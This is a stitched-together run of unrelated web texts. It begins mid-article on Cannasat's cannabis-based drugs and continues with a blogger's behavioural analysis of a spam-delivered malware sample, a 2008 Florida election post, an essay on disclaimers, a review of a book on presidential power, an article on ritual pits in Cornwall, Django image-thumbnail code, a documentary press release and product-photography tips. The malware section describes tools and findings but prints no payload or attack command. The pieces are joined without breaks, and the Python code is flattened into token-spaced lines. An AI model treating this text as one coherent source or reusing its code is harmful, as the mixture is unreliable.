That issue led to the failure of an earlier attempt to complete Phase I trials for CAT 310 .
But Syed says that problem can be overcome with a tweaking of the formulation in advance of CAT 310's new set of Phase I trials . "
The article notes , " But CAT 310 is only the first step in Cannasat 's long - term strategy .
The company has another , even bigger , project in the works - a potential ace up its sleeve called CAT 320 .
The drug is based on a molecule found in cannabis leaves called cannabidiol ( CBD ) - which has none of the psychoactive properties associated with marijuana - and is showing potential in the treatment of various mood and psychotic disorders including schizophrenia , a huge global market .
In 2005 , German scientists reported results of a small study involving schizophrenics , during the International Cannabinoid Research Society conference , held in Tampa , Fla. , that year .
That study showed that CBD , taken four times a day , was as effective as any of the dopamine inhibitors currently on the market for schizophrenia - but without side effects that include rapid weight gain and a muscle rigidity resembling Parkinson 's disease .
Since dopamine inhibitors are used to treat a variety of psychiatric disorders , Cannasat is now rushing to replicate the German study and reformulate CBD into a once - a - day time - release capsule , which is far easier for mental patients to take .
If the company 's human trials - scheduled to begin spring of 2009 - prove successful , CAT 320 could ultimately compete with current dopamine drugs and take a substantial chunk of the $ 15 - billion market in North America .
' We know we have a winner , ' says Syed . "
The article adds , " Cannasat 's last remaining hurdle is the one they 've already worked hard to overcome : the market 's reluctance to invest in cannabis - based drugs .
It may seem trivial , but Cannasat 's survival will depend on support from fund managers , and Hill says the company has to do more to convince them that its products will be accepted by regulators .
After all , similar drugs have already been approved . "
Well , today was n't exactly a tough handler 's shift so I thought I would look in my spam folder for something interesting .
There is always something interesting in there , subject wise most are things which are n't even mentionable in public .
However , in many of these emails are links and at the end of the link is the world of malware .
So , I feel compelled to follow them ( in a nice , safe environment ) .
Today 's attempt was a complete success on the first piece of spam I opened .
Sure enough I found a nice executable at the other end just waiting to be downloaded .
What a relaxing way to spend a Saturday , doing a little malware analysis .
I opened it in Ollydbg , got past the packer and took a look at the strings in the file .
Sure enough , this file was n't one filled with good intentions .
If you a look at the strings below , you can see what I 'm talking about at first glance .

I checked out the IP found in the strings above and grabbed its source code .
The only thing on the page was this :
" < html >< body > < h1 > It works !</h1></body></html > "
So now I 'm wondering if this malware has fangs yet or if its being distributed in a trial mode .
I launched the malware on
one of my VM windows images and found that it looked pretty benign .
Here is where it started to get interesting .
I used a
tool called RegShot to get a " before " snapshot of my machine state .
After launching the malware I used it to get an " after "
snapshot of my machine state .
There did n't seem to be any files dropped on my harddrive , however there is a mention of a
file above called " CbEvtSvc.exe " .
When I launched the malware , I also had some other tools running .
I like to use other
tools too when I 'm doing behavioral analysis like : RegMon , FileMon , ProcessExplorer , TCPView , etc. Both RegMon and FileMon show that CbEvtSvc.exe was busy on my system .
As a matter of fact , FileMon had this entry :

So the file had been created , but where was it ?
I used explorer to look for it and found nothing .
I then used cmd.exe to
look at the directory for the file and nothing was there .
I thought maybe its hidden and I can reference it another way .
From the command prompt , I tried to run the following command in system 32 directory : dir * cb * and guess what , my window closed on me .
I tried this method again and could find any other variety of files this way as long as it was n't the first letters of that filename .
Now I 'm thinking rootkit capabilities ... cool !
Since my antivirus did not have issues when I downloaded the file using wget , I thought I 'd throw it at a few sites and see what they thought of my new toy .
Norman Sandbox provided this analysis which disturbed me :
my_hots_video : Not detected by Sandbox ( Signature : NO_VIRUS )

VirusTotal provided me results showing 14/36 ( 38.89 % ) vendors had detection for this file .
Not great coverage by any means , but at least some vendors know that its bad and have a signature for it .
I 'm not done with this file yet , its rather interesting .
What I really wanted to point out is that my tools did not provide me with accurate answers .
Tools are simply that ... just tools .
As you work with malware , its important to have many ways to confirm your results .
Its just as important NOT to totally rely on your tools to provide you with the answers .
You HAVE to understand the tools your using .
Do n't become so dependant on one way of verifying something .
I run many tools at the same time when I work with malware .
Each has a different purpose as well as strengths and weaknesses .
It 's important to know them and not just rely on a single method .
In essence you want to look at malware from many different angles and never forget that your tools are only so good and may not provide you with the right answer .
Nothing can replace your analysis skills and your ability to understand what your seeing .
With Obama taking the lead in Florida via the newest polling data on the battle ground states , ON ABC's THIS WEEK , Republican Senator Mel Martinez actually said that the economy is no big deal .
The people of Florida will get past it and McCain will win the state !
How insensitive can a man be ?
STEPHANOPOULOS : Senator Martinez , let me begin with you .
Florida has one of the highest foreclosure and unemployment rates in the country right now .
And four Florida polls since the financial crisis hit all show Barack Obama ahead .
So as the Obama campaign charges , is your campaign desperate to
change the subject ?
SEN .
MEL MARTINEZ ( R ) , FLORIDA :
Well , look , for sure , the
economy hurt the McCain campaign in Florida .
Florida has been very
hard - hit , as you just stated .
The fact of the matter is that there is
much to be done yet .
The fact of the matter is that Florida is far from being over .
Florida is going to be close all the way to the end .
McCain was well ahead in Florida before the economic crisis hit .
I believe once this campaign gets beyond that immediate crisis that Florida is going to come back to the McCain camp .
Blog posts are short and have a broad audience .
One of the worst things about writing them is having to make disclaimers .
Not just legal disclaimers mind you – those are only the tip of an iceberg .
Writing is hard in part because words have many associations that vary among readers .
Even when we use carefully choose our words to signal certain associations , we know some readers will instead hear other associations .
So in addition to saying what we do mean , we sometimes have to say explicitly what we do not mean .
For example , most who say " Can I help you with that ? " also mean to say " I am offering to help you with that . "
So if you really just want to ask about your ability to help , but do not want to offer to help , you must explicitly disclaim the offer , as in " I ’m not offering to help , but I was wondering , is it somehow possible for me to help ? "
It seems reasonable to have to say more in this case , as this is the more unusual case .
Less reasonably , in our current legal system anyone with an employer who writes anything is expected to explicitly declare that they are not speaking for their employer .
Apparently if they do not their employer can be sued for anything they say .
This is unreasonable because the vast majority of writings by people with jobs are not intended to speak officially for their employer .
It would be far more reasonable to assume that we speak only for ourselves unless we explicitly say otherwise .
It is similarly unreasonable for fiction authors to have to always declare all their characters are fictional .
Unfortunately , the problem goes way beyond dumb legal rules .
Consider these common presumptions :
If you say anything about correlates of race you must hate a race .
If you say anything about genetic correlates of success you are a social Darwinist .
Any general claim about human behavior is an absolute law without exception unless it includes qualifiers like " tends " or " often . "
If you quote someone you agree with everything they ’ve said .
If you say you prefer option A to option B , you also prefer A to any option C .
If you say anything nice ( or critical ) about anything associated with a group or person you are presumed to support ( or oppose ) them overall .
If you say anything nice ( or critical ) about anything associated with an idea or claim you are presumed to support ( or oppose ) it and related ideas overall .
If you worry that more A will cost too much of B , you do n’t care about A at all .
If you dislike a proposed solution to a certain problem , you do n’t care about that problem .
If you oppose one end of a continuum , you support the other end .
If you approve of a decision you approve of the actual outcome , and vice versa .
If you think A causes B , you think A is necessary for B .
Any opinion you express is a strongly and confidently held opinion .
If you criticize someone about something , you say you are immune to such criticism .
[ I ’ll add more here as commentors mention them . ]
Most who say such things do not intend these further claims , and their conversation could be much easier if they did not need to constantly disclaim them .
But they are stuck in a signaling game ; since most who say such things do add the required disclaimers , observers can infer something unusual about the few who do not .
A friend once told me that in a Stanford artificial intelligence theory class , while the prof tried to present relatively precise claims , students constantly asked if he was really trying to say distantly related claims X , Y , or Z .
My exasperated friend cried " Why ca n’t they just treat it like math – assume nothing you are not told you can assume ! "
Yes full math precision is rarely possible , but sharp people still distinguish themselves by not assuming more than needed to keep the conversation going .

The Cult of the Presidency : America ’s Dangerous Devotion to Executive Power
Gene Healy
Cato Institute , 2008
367 pp .
By Doug Bandow
American liberty is dying .
For years the process has been slow strangulation , as successive Congresses and presidents , irrespective of party , expanded government power .
True , Republicans usually tightened the garrote a bit less quickly .
But the end point was the same : the expansive , expensive welfare - warfare state .
Alas , both parties have combined to give the growth of government authority a dangerous twist : the aggrandizement of the executive .
This has been a constant in wartime : Abraham Lincoln , Woodrow Wilson , and Franklin Delano Roosevelt all used the alleged necessity of war to justify enormous expansion of not just their congressionally enacted powers , but also their supposed unilateral authority .
Last century Democratic presidents led the way in exalting the executive , but now the Republican Party , while endlessly blathering on about individual liberty and limited government , is claiming that the president is a democratically - elected king .
The Republican worship of unilateral executive power has reached its apotheosis in the Bush administration .
Taken seriously , President George W. Bush claims to have the right to ignore the Constitution at home for as long as we are at war  which means forever , since the “ war on terrorism ” has no obvious endpoint and the battlefield is the entire world , including the United States .
Admittedly , President Bush so far has not fully exercised these extraordinary powers , which logically include the authority to disband the Supreme Court and prorogue Congress for interfering with his attempt to protect America from terrorism .
But if the president can designate an American citizen arrested in America as an enemy combatant to be held incommunicado by the military without access to legal counsel for years , then is there anything the president cannot do ?
Gene Healy , a scholar at the Cato Institute , tracks the growth in executive power in his new book , The Cult of the Presidency .
The story he tells is extraordinary , and is extraordinarily important .
Consider the role of the presidency intended by the nation ’s founders , compared to what it is today .
Healy opens with the claim by former Arkansas Gov. Michael Huckabee that “ America needs positive , optimistic leadership to kind of turn this country around , to see a revival of our national soul . ”
Not restore our liberties and restraints on government .
Not even reform public programs to meet pressing social needs .
But revive America ’s soul .
Healy wonders what kind of crisis has Michael Huckabee as the solution .
More seriously , he asks , “ what sort of office did Huckabee imagine he was running for ?
Is reviving the national soul in the job description ?
And if reviving the national soul is part of the president ’s job , what is n’t ? ”
The answer , he concludes , is not much .
And among the Democratic and Republican presidential candidates , only Rep. Ron Paul , the iconoclastic Republican candidate for president , believed his role was to fulfill the limited powers bestowed by the Constitution , rather than to console and uplift 300 million Americans .
The essential point is that whatever the partisan differences between the two major parties  and the discourse has grown increasingly acrid  there is little disagreement over treating the president as national pastor , counselor , philanthropist , economic manager , symbol , guardian angel , psychoanalyst , investor , global leader , popular voice , and righter - of - all - wrongs .
Writes Healy : “ many of the same people who condemn the growing concentration of power in the executive branch also embrace a virtually limitless notion of presidential responsibility .
Today , politics is as bitterly partisan as it ’s been in three decades , and the Bush presidency is at the center of the fight .
But amid all the bitterness , it ’s easy to miss the fact that , at bottom , both Left and Right agree on the boundless nature of presidential responsibility . ”
That is n’t the government established by the Founders , of course .
Politicians and pundits on the Right routinely praise the brilliance and prescience of those who framed the Constitution , but none among the latter would recognize today ’s government as related to , let alone the logical outcome of , their labors .
They would be appalled at and horrified by the monster their original government of few enumerated powers had become .
And the Founders would have been particularly horrified by the fact that the president of today is far more powerful  and thus far more dangerous  than the king of yesteryear , against whom they revolted .
Healy provides a good summary of the institutions of government as originally established by the Constitution .
He is particularly effective in disposing of what he terms “ unitarian heresies , ” the bizarre notion , advanced today by many conservatives , that the Founders intended to provide the president with monarchical powers .
( True , the “ unitarians , ” as Healy playfully calls them , prefer not to put it that way .
But what else should one call the authority to initiate war , arrest citizens , abrogate constitutional rights , torture suspected adversaries , ignore the legislature , and much more ? )
The Constitution would not have made it out of the constitutional convention , let alone been ratified by the states , if this kind of unitarian theory had been advanced at the time .
The first major , sustained ideological assault on constitutional government came from the left , most notably the Progressives .
Both Theodore Roosevelt and Woodrow Wilson were Progressive exemplars .
The first was a thorough - going imperialist , the second a messianic racist .
Both expanded power in peace and war .
Wilson took America into World War I , an entirely unnecessary war which was irrelevant to U.S. interests and culminated in the unjust and unsustainable Versailles Treaty , which a generation later naturally led to another conflict , the worst in human history .
Two “ normal ” presidencies followed , of Warren G. Harding and Calvin Coolidge .
But Herbert Hoover was an economic micro-manager and meddler , who appears conservative only in comparison to Franklin Delano Roosevelt , who began the sustained era of the “ heroic presidency . ”
Explains Healy , “ well before the war , it had become clear that increasing numbers of Americans looked to the president for personal help in a way that would have seemed peculiar  even dishonorable  to their fathers and grandfathers .
Before the advent of the modern presidency , few Americans had bothered to write to the president , who was , after all , a distant official in Washington with duties that only rarely had a direct impact on ordinary people .
FDR ’s revolutionary presidency changed all that . ”
Healy takes readers through a succession of presidents who were expected to do so much more than in the past  enact legislative programs , keep America prosperous , voice common concerns , and lead the world .
This rise in expectations encouraged presidents to claim even more authority .
For instance , President Harry S. Truman ’s Attorney General , Holmes Baldridge , made the astonishing claim that while the Constitution limited the authority of the legislative and judicial branches , it did not constrain the executive branch , meaning that the president “ has the power to take such action as is necessary to meet ” an emergency , and in matters of great moment that would mean unlimited power .
In the sense of making extravagant claims for presidential authority , at least , George W. Bush is Harry S. Truman reincarnated .
The Heroic Presidency suffered under the Nixon and Carter presidencies .
Congress regained some of its lost authority , angering unlimited executive power conservatives like Richard Cheney , who complained in 1984 that during the previous decade legislators attempted “ to limit future presidents so that they would not abuse power the way it was alleged some had abused power in the past , ” which means Congress had failed “ to help presidents accrue power in the White House  so that they could achieve good works in the society . ”
That is rhetoric one once would have expected from the Left .
The political pirouette was extraordinary : conservatives fought against Franklin Delano Roosevelt ’s and Lyndon Johnson ’s political pretentions .
The 1964 GOP presidential nominee , Sen. Barry Goldwater , complained that “ If ever there was a philosophy of government totally at war with that of the Founding Fathers , ” it was “ the current worship of powerful executives . ”
But after Republicans captured the presidency while despairing of ever taking the House of Representatives , many of them , like Richard Cheney , decided that the executive branch actually represented the fount of most constitutional power .
An important measure of this philosophy is the endless whining over rising levels of distrust of government .
Why is this bad ?
Observes Healy : “ Yet , it ’s never been clear why a healthy  and , by the 1970s , manifestly justified  distrust of unchecked power should be cause for so much angst .
That sort of distrust , after all , is the core of our political heritage . ”
Unfortunately , the ebbing of popular distrust of government , he notes , had “ served as a presidential enabler .
Unwarranted trust had allowed unrestrained spying at home and disastrous presidential adventurism abroad . ”
But even the resurgence of doubt about the exalted presidency is not enough , so long as Americans have “ inordinately high expectations for the office , ” notes Healy .
While endless lies mixed with extraordinary incompetence have soured the public on how presidents are likely to behave and what they are likely to achieve , Americans still seem to want the chief executive to run America and the world .
The concept of president as “ Superman ” returned with a vengeance after 9/11 .
If ever there was a desire for a national voice , it was then .
Average people wanted reassurance , liberal hawks joined neoconservative extremists in pushing for an international crusade , Republican apparatchiks saw the opportunity for political gain , and Democratic pols wanted to avoid accountability at all costs .
The result was the catastrophe otherwise known as the Bush presidency .
Healy ’s detailed history of the Bush administration ’s extraordinary and extraordinarily dangerous power grab makes for depressing reading .
Few heroes emerge : it turns out that the guardians of the people ’s liberties are distressingly few .
Under Republican leadership , virtually no bucks stopped with the Congress , which acquiesced in every power grab by the Bush administration .
The new Democratically - controlled Congress is little better , having failed to confront the administration over any power grab of substance .
Today the president claims to possess virtually unlimited powers and one of his chief theorists , law professor John Yoo , claims that the only test of the legitimacy of presidential power is “ why the president thinks he needs to do ” something , yet serious congressional oversight remains virtually absent .
Perhaps even more depressing , though , is Healy ’s analysis of “ why the worst get on top and get worse . ”
One problem is what it takes to win office today  fidelity to the Constitution is not , shall we say , typically a necessary factor .
Another cause is what the office does do its holders .
As a mid-level White House aide I enjoyed perks and status which suggested a right and duty to “ govern . ”
The president lives a truly exalted life , one that brings to mind “ the life of a court , ” as Healy suggests .
There is much to corrupt the judgment of even the most balanced and best intentioned person .
Healy emphasizes that the problem is not peculiar to George W. Bush .
The current president is to blame for much , “ But George W. Bush is hardly the first president to become intoxicated by power and detached from reality .
And whatever dysfunctional behavior Bush has exhibited pales in comparison to that of presidents past , ” writes Healy .
America needs to return to a normal presidency , he argues , but how to get there is unclear at best .
There are many moving parts in today ’s political system , and few are directed at restraining the executive branch .
The biggest obstacle to success is the fact that the public appears to like today ’s presidency , even if not always the particular occupant .
As Healy observes , we desperately need a president “ who is bold enough to act when action is necessary , yet wise enough , humble enough to refuse powers he ought not to have . ”
Alas , Healy warns , the American people “ wo n’t get that kind of presidency until we demand it . ”
Witches of Cornwall by Kate Ravilious
Macabre evidence of age - old spells surfaces in an archaeologist 's front yard
Archaeologist Jacqui
Wood holds a fragment of a cauldron unearthed from a buried spring - fed pool near her home .
This and other artifacts she has found point to a long history of ritual and witchcraft .
( Manuel Cohen )
Over the centuries , many in the British Isles have appealed to witches in times of need -- to cure a toothache , concoct a love potion , or curse a neighbor .
Witchcraft , the rituals of a number of pagan belief systems , was thought to offer control of the world through rites and incantations .
Common as it has been over the past several centuries , the practice is secretive and there are few written records .
It tends to be passed down through families and never revealed to outsiders .
But archaeologist Jacqui Wood has unearthed evidence of more than 40 witchy rituals beneath her own front yard , bringing to light an unknown branch of witchcraft possibly still practiced today .
Wood 's home is in the hamlet of Saveock Water in Cornwall , a county tucked in the far southwest corner of the country .
For thousands of years people have raised crops and livestock in its fertile valleys , and its coastline of dramatic cliffs , secluded coves , and pounding surf was once a haunt for smugglers .
Cornwall is a place time forgot ; steeped in folklore , myth , and legend ; and purported to be inhabited by pixies , fairies , and elves .
So it should come as no surprise that it has also been home to the dark arts .
When I visit Saveock Water it is raining , which adds to its unearthly atmosphere .
Wood , a warm lady with sparkling hazel eyes , greets me in her cozy white - washed barn while rain hammers on the roof .
She moved to Saveock Water 15 years ago because it was an ideal location for her work in experimental archaeology , replicating ancient techniques , including those used in farming or metallurgy .
Since then she has carried out her experiments , such as growing ancient crop varieties , unaware of what lay under her fields .
In the late 1990s , Wood decided to do some metalwork research by re-creating an ancient kind of furnace .
" I dug down into the ground to construct a shelter close to the furnace and I discovered a clay floor , " she says .
Wood was excited but busy with other projects and left the find undisturbed for a few years .
In 2001 , she gathered some archaeology students to explore it further .
" It was a nightmare to dig because the field is covered in a soft rush grass with a dense web of roots , and the soil is heavy and laden with water , " says Wood .
While digging a hole for another project , Wood discovered a late Mesolithic clay platform in her field .
She found that small pits had been dug into the platform at a later date , and contained bizarre collections of items including swan skins , pebbles , and bird claws .
( Manuel Cohen )
As the group peeled off layers of turf , they discovered the clay floor was an extensive man-made platform -- probably a foundation for a group of ancient dwellings .
During a break in the rain , Wood takes me out to have a look .
What used to be a half - acre marshy field is now a slippery clay surface , covered with small plastic crates protecting finds .
Based on flint fragments embedded in the clay , a Danish specialist dated the site to the late Mesolithic , around 8,500 years ago .
But as Wood and her team excavated the platform over the next few seasons , unusual features began to emerge .
They came across strange rectangular holes , about 15 by 10 inches , in the clay .
" At first we thought they must be postholes or something , " says Wood .
But the first of the holes , about 6 inches deep , was lined with white feathers .
The pits cut through the clay platform , so Wood knew that they had to date to a later time , but only an expensive radiocarbon test could pin it down .
" We guessed it might have been a bird - plucking pit , a common farming practice at the turn of the 19th century , " says Wood .
But that could n't be the case -- Wood found that the feathers were still attached to the skin , which had been laid in the pit with the feathers facing inward .
A bird expert from the local zoo confirmed they came from a swan .
On top of the swan skin , Wood found a pile of pebbles and a number of claws from different birds .
She later learned that the stones came from a coastal region 15 miles away , though no one knows why they were brought from so far .
Someone had gone to considerable trouble to gather the contents of this pit .
That season , Wood and her colleagues found eight pits , two of which contained odd collections of bird parts , and six of which had been emptied , but with a few telltale feathers and stones left behind .
" Over the last 30 years I 've been quick to dismiss ritual as an explanation for unusual archaeological finds , " says Wood .
" It usually means that the archaeologists can't think of anything better .
So now it seems especially ironic that I end up with a site absolutely full of ritual . "
More unusual finds came in 2005 .
Sandwiched between two of the rectangular pits was a round pit with a swan - feather lining .
On top of the swan feathers nestled 55 eggs , seven of which contained chicks that would have been close to hatching .
The shells of the eggs had dissolved , but the moist environment had preserved their membranes .
Remains of magpies -- birds associated with luck and superstition even today -- had been placed on each side of the eggs .
By that time Wood was convinced that only witchcraft could explain her unusual finds , but no one had ever heard of anything like this .
Radiocarbon tests revealed the swan skins dated to around A.D. 1640 , the time of civil war in England and a very dangerous period to be practicing witchcraft .
" Any sort of pagan worship was classified as witchcraft at that time , and punishable by death , " says Wood .
" If caught , they would have been burned at the stake . "
To make things worse , swans were royal symbols and property of the crown , so killing a swan was doubly risky .
Witch trials were common during the 16th and 17th centuries , and sometimes a few whispers were enough to see someone hanged .
" During the 1650s more than 25 people were sent to Launceston Gaol [ prison ] , in Cornwall , after a woman was accused by her neighbors of being a witch .
She promptly implicated others in her alleged practice of the dark arts , some of whom were executed , " says Jason Semmens , assistant curator at the Horsham Museum in Sussex and an expert on witchcraft in Cornwall during the 17th century .
And yet witchcraft remained popular , says Marion Gibson of Exeter University , a specialist on 16th - and 17th - century paganism .
" Every village would have had people thought to be skilled in magic in one way or another and people in the area would go to them for their specialist services , just as we might go to a lawyer or plumber today . "
Wood leads me to one of the pits and pulls the plastic lid off .
I get a sense of the shock she must have felt when she found them .
Swan feathers line the pit and muddy , wrinkled egg membranes sit on top .
A shiver runs down my spine as I imagine someone coming here in the dead of night , digging a hole , and carefully placing these offerings in it .
What made them desperate enough to risk death if caught ?
One explanation is that some of the pits contained offerings to St. Bridget ( or Bride ) of Ireland , the patron saint of babies and infants , who may be associated with the pagan goddess Brigid .
" My theory is that maybe if you got married and did n't become pregnant in the first year , you might make an offering to St. Bride in a feather pit , " says Wood .
Women who then became pregnant might have had to empty their pits and burn the contents , she postulates .
Wood and her colleagues had further spooky discoveries ahead .
Not far from the three pits , they uncovered the remains of a spring - fed pool , carefully lined with white quartz , and containing 128 textile scraps , six medieval straight pins , shoe parts , heather branches ( associated with luck ) , fingernail clippings , human hair , and -- it does n't get more witch - like - - part of a cauldron .
" Two of the pieces of fabric contained wool and silk , indicating they originally belonged to someone of high status , " says Wood .
Others were coarser and may have come from those of lower status .
Looking at the textile fragments stored in little plastic boxes in Wood 's barn , it is hard to believe they are 350 years old -- the vivid blues , golden yellows , and vibrant greens were preserved by the moist environment .
Further excavation uncovered a stone - lined drain and a second pool that only fills in winter .
Wood realized that the pools were much older than their contents , and that this site may have been special to people for thousands of years .
Based on stratigraphic evidence , she believes the quartz - lined pools are 6,000 years old .
" The white quartz would have made the pools glow in the moonlight , and we think they may have been very special , a place of ritual for people in those times , " she speculates .
If the pools do date back that far , they retained their sacred status throughout the ages , as by the 17th century people were using them as a place of offering , throwing in personal fragments ( such as fabric and hair ) for good fortune .
However , the practice stopped in the late 17th century , when the crown paid locals to fill in the pools ( along with other " holy " wells in Cornwall ) to prevent pagan rituals .
Now that Wood has rediscovered the pools and word of them has spread , they have again become a special site for those of mystical inclination .
While I chat with Wood in her barn , a homeopath , a practitioner of alternative medicine , arrives to collect water from the spring .
He believes it has unique properties and comes every day to collect his family 's drinking water .
Experts are baffled by the finds .
The closest similar example of witchcraft is the witch - bottle , popular during the 17th century .
" You could retaliate against someone who bewitched you by placing some of your own urine , hair , and nail clippings into a bottle and burying it .
As the contents decayed , so would the witch , and her curse would suffer and be lifted , " explains Semmens .
Present - day witches , shamans , and druids have taken interest in the site , and visit to offer their explanations for Wood 's discoveries .
Mike Slater , a witch from a pagan community in Bristol , thinks the pits and pool offerings have an amorous motive .
" It has long been known that swans pair for life .
Also nail parings and hair are commonly used in love spells , " he says .
Wood 's 2008 field season brought more unusual discoveries .
" We have been uncovering some extraordinary animal pits , " says Wood .
One was lined with the skin of a black cat and contained 22 eggs , all with chicks close to hatching , in addition to cat claws , teeth , and whiskers .
Another held a dog skin , dog teeth , and a baked pig jaw .
The week prior to my arrival , Wood 's students uncovered a pit that contained a mysterious seven - inch iron disk with a swan skin on one side and animal fur on the other .
The biggest shock of all came from the radiocarbon dates for these pits .
The cat pit dated to the 18th century , while the dog pit dated to the 1950s .
" And I doubt it just suddenly stopped in the 1950s , " says Wood .
" It is plausible that it could still be continuing now . "
It is not clear whether the pits were the work of a single family or a countrywide guild of witches .
One lead came from a conversation between a member of Wood 's excavation team and some locals in a pub .
They recalled that there was a family , the Burnetts , reputed to be witches , that lived near Wood 's house .
Two sisters resided there until the 1980s , so it is possible the dog pit could have been their work .
Today a relative of the Burnett sisters is still there , but Wood - - for whatever reason - - has n't yet plucked up the courage to visit .
Kate Ravilious is a science writer based in York , England .
I normally like to write code myself instead of installing some large script just to do one task for me .
There were a few scripts out there that could create thumbnails , but I wanted something simple and would n’t use most of those features .
Plus , I wanted to know how to use the Python Image Library with Django 1.0 and learn on my own how to take an uploaded picture and create a few thumbnails of them .
After searching for a while I was able to piece some things together to get something working .
In my model I added these two functions .
def thumbnailed ( self , file , width , height ) : from django .
core .
files .
base import ContentFile from StringIO import StringIO import Image try : size = width , height tmp_file = StringIO ( ) im = Image .
open ( StringIO ( file .
read ( ) ) ) format = im .
format # since new im wo n't have format if format == " gif " or format == " GIF " : im = im .
convert ( " RGB " ) im .
thumbnail ( size , Image .
ANTIALIAS ) if format == " gif " or format == " GIF " : im = im .
convert ( " P " , dither =Image .
NONE , palette= Image .
ADAPTIVE ) im . save ( tmp_file , format , quality= 95 ) except IOError : return None return ContentFile ( tmp_file . getvalue ( ) )
Using StringIO
I was able to create a temporary file in memory to hold the thumbnail data and return it where it would later be passed to django .
I was trying to create 3 thumbnails which presented another problem : django was obliterating the uploaded file and the data in my temp files when I was saving .
So I figured out how to get around that , but there may be better ways .
def create_thumbnails ( self , file ) : pic = self .
thumbnailed ( file , 160 , 400 ) if pic is not None : self .
picture .
save ( file .
name , pic , save= False ) # Django's InMemoryUploaded
File uses StringIO #
This will reset it to be ready to use again file .
seek ( 0 ) thumb = self .
thumbnailed ( file , 288 , 96 ) if thumb is not None : self .
thumbnail .
save ( file .
name , thumb , save= False ) # Django's InMemoryUploaded
File uses StringIO #
This will reset it to be ready to use again file .
seek ( 0 ) tiny = self .
thumbnailed ( file , 144 , 48 ) if tiny is not None : self .
tiny_image .
save ( file .
name , tiny , save= False )
The model has picture , thumbnail , and tiny_image as ImageFields and create_thumbnails was originally called from the view and passed the uploaded file from request .
FILES .
There was a lot of trial and error trying to get this together , so I hope it helps someone get past that .
Updated July 10 , 2009
I added a condition to check if the image is a gif .
If it is , it is converted so that the thumnails will look much better than they would without converting them .
I also set the quality to 95 so that all images will have the best possible thumbnails .
I use webfaction to host a lot of my django projects .
It has an easy setup that will get you developing quickly and a great community of talented programmers .
There is also a quick setup for rails , wordpress , and a lot more .

Washington , D.C. , 17 October 2008 –
The new documentary film on the Bush administration ’s interrogation and detention policies , Torturing Democracy , will air on Washington D.C. ’s WETA - TV tonight at 10 p.m .
Produced and written by eight - time Emmy winner and National Security Archive fellow Sherry Jones , the documentary has drawn major online buzz as well as New York Times coverage of PBS ’s failure to find a national scheduling spot for the film before President Bush leaves office in January 2009 .
Reviewers have described the film as a “ compelling example of video story - telling ” that “ delivers impressively on a promise to connect the dots in an investigation of interrogations of prisoners in U.S. custody . ”
Slate.com selected a key revelation in the film as the Slate “ Hot Document ” this week – a previously unpublished December 2002 draft of “ standard operating procedure ” at Guantanamo which shows that interrogators there adopted their techniques directly from the survival training ( Survival Evasion Resistance Escape or SERE ) given to American troops so they could resist the worst of Communist gulag treatment .
The companion Web site for the film , www.torturingdemocracy.org, features key documents , a detailed timeline , the full annotated transcript of the show , and lengthy transcripts of major interviews carried out for the film .
Hosted by the National Security Archive at George Washington University , the Web site will ultimately include a complete “ Torture Archive ” of primary sources .

Weber Moving out of the kitchen and into the backyard , Weber , a well - known maker of grilling and other cooking equipment , has a fine product photography area on its website .
The website itself is pretty basic , as you might expect , without much in the way of attractive text or icons , but the sharp images and high - quality close - ups add a lot of visual appeal .
If nothing else , this is a good example of how good images can help a website overcome a mediocre design .
Bang & Olufsen
Turning to a website that at first glance seems a bit less inviting , audio - video manufacturer Bang & Olufsen opts for a harder , more architectural aesthetic than some of the other websites we ’ve looked at .
While there is plenty of black , gray and white throughout , this website is far from cold and sterile , thanks to the side - sweeping product photos , which are bright but do not compromise the futuristic feel of the design .
The pages of Bang & Olufsen ’s collection have another nice touch : product thumbnails glow when you hover over them .
Leica
As you might expect from one of the world ’s biggest names in photography and imaging technology , Leica has some high - quality images , especially of its camera equipment .
You wo n’t find a ton of photos here , but in keeping with the brand ’s no-frills , no - nonsense approach , the pictures you do see are high - res and sharp , a perfect example of how to do more with less .
Victorinox Another brand known for precision equipment , Victorinox has an impressive range of visual content on its website , especially in the product area .
The sliding photo gallery in the “ Timepiece ” section , for example , captures both the mechanical and aesthetic beauty of the brand ’s watches : you can really imagine how it would feel to hold and wear the watch , while still being able to see the complexity of its internals .
The website is also notable for its great examples of selective focusing and dramatic lighting , which really make the products eye - catching .

Four Steps Of Product Photography
1. Prepare Product
To take quality photographs , the complexity and time required will depend greatly on the type of product you ’re shooting .
Some of the easiest products to photograph are solid objects such as cups and toys ; you may just have to give them a good polish before shooting .
Clothing , textiles and other items that can bend , stretch and wrinkle are much harder to photograph and could require hours of ironing and arranging to get a perfect result .
Details , like whether a shirt collar is straight , will determine whether the photographs look like they were shot in a serious studio or by an amateur with a point - and - shoot camera .
Whatever the product , inspect it carefully for tears , stains , chips and other imperfections before beginning .
2. Light
To get a great - looking photo , lighting is crucial .
Fortunately , with many products , you do n’t need much equipment to get a well - lit balanced exposure .
For objects the size of a digital camera or smaller , you can use an EZcube light tent with two small 30 - watt bulbs on either side .
For larger items , such as clothing , two 60 - watt soft boxes on either side of the product should suffice .
Also consider using a light reflector to get rid of any shadows and obvious highlights .
3. Set Your Camera
Watch out for noticeable light reflections on shiny surfaces .
Even though most product photos look very staged , you do n’t want yours to look too artificial .
Obviously , you ’ll need a camera to take pictures , so make sure you have one .
It does n’t have to be the best or most expensive on the market , but it should at least have manual focus and shutter and aperture controls .
These are all standard on most SLR cameras .
Once you ’ve arranged the product and lighting equipment , take a few test shots until you get an exposure that is n’t too bright or too dark .
Keep track of the shutter speed and aperture settings of your best photos , and use them again in future to maintain consistency .
If you are n’t sure how things like shutter speed , aperture and lens focal length affect images , you might want to do some basic research .
If you understand the basics of photography but your photos still do n’t look quite right , do n’t worry , because you may have to change several in - camera settings before getting the kind of shots you want .
If your pictures look soft or do n’t enlarge well , make sure the ISO setting on your camera is as low as possible .
The ISO setting affects the light sensitivity of a camera ’s photo sensor .
By setting yours to 100 or 200 , you ’ll get a higher - resolution shot with less grain and pixellation .
While you ’re at it , change the camera ’s image size to the highest possible setting .
Most cameras default to a medium - sized resolution ( around 1500 x 850 pixels ) .
Next , make sure the white balance is set to handle the kind of light you ’re working in .
Most cameras have modes for incandescent , fluorescent , direct sunlight and cloudy environments , and you should adjust your camera ’s white balance according to these different conditions .
If the white balance controls are off , your images might either look too bright or have a sickly yellow cast , especially if your product is white .
Color control settings are important to consider as well .
Most digital cameras allow you to select several degrees of color saturation , ranging from muted to normal to vibrant .
If your product is already colorful ( flowers , for example ) , a less saturated setting would probably work better .
This is especially true with red , which many digital cameras ( even high - end ones ) have difficulty processing .
Finally , make sure the image format is appropriate .
